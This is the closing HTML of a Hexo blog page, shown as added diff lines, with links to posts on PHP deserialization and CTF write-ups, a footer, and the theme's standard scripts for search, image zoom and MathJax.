+    <a href="/2020/10/27/%E9%98%B6%E6%AE%B5%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/%E4%B8%80%E6%96%87%E8%AE%A9PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E8%BF%9B%E9%98%B6(%E8%BD%AC)/" rel="next" title="一文让PHP反序列化从入门到进阶(转)">
+    上一篇：一文让PHP反序列化从入门到进阶(转)
+  </a>
+</p>
+
+
+
+<p class="pink-link-context">
+    <a href="/2020/10/25/CTF%E7%AC%94%E8%AE%B0/%E5%90%84%E7%A7%8DCTF%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0WriteUp%F0%9F%98%8A/" rel="next" title="各种CTF练习平台WriteUp😊">
+    下一篇：各种CTF练习平台WriteUp😊
+  </a>
+</p>
+
+
+            </div>
+			
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+</div>
+
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large pink">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect green" title="回到顶部"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse yellow darken-1"  data-activates="main-menu" title="菜单"><i class="fa fa-navicon"></i></a></li>
+    </ul>
+  </div>
+
+    </main>
+    <footer class="page-footer indigo darken-1">
+    
+    <div class="footer-container container">
+        <div class="row">
+            
+            <div class="social-group col m4 s12">
+                <h5 class="white-text">社交</h5>
+                
+                    <a class="social-link" href="http://weibo.com/1956184117" target="_blank">
+                        <i class="fa fa-2x fa-weibo"></i>
+                    </a>
+                
+                    <a class="social-link" href="https://github.com/raytaylorlin" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                    <a class="social-link" href="/atom.xml" target="_blank">
+                        <i class="fa fa-2x fa-rss"></i>
+                    </a>
+                
+                
+
+            </div>
+            
+
+            
+            <div class="col m8 s12">
+                <h5 class="white-text">友情链接</h5>
+                
+                    <a class="social-link" href="http://raytaylorlin.com/" target="_blank">raytaylorism主题作者的技术博客</a>
+                
+                    <a class="social-link" href="https://github.com/raytaylorlin" target="_blank">Github地址（测试友情链接）</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+
+    <div class="footer-copyright pink-link-context">
+        <div class="container">
+            © 2016 example.com, All rights reserved.
+            <p class="right" style="margin-top: 0;">本博客由 <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> 强力驱动 | 主题 <a target="_blank" rel="noopener" href="https://github.com/raytaylorlin/hexo-theme-raytaylorism">raytaylorism</a></p>
+        </div>
+    </div>
+</footer>
+
+
+    <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+
+            // 目录随屏幕滚动（防止目录过长越过footer）
+            var $toc = $('.toc');
+            var scrollTargetTop = 0;
+            $(window).scroll(function() {
+                var $activeLink = $toc.find('a.active.section');
+                if ($(window).scrollTop() < 100) {
+                    scrollTargetTop = 0;
+                } else {
+                    if ($activeLink[0]) {
+                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
+                    }
+                }
+                $toc.css('top', '-' + scrollTargetTop + 'px');
+            });
+
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass('pink lighten-2');
+
+            
+            // 添加new标签
+            $('').append('<span class="new badge pink"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "search.xml";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+</body>
+</html>
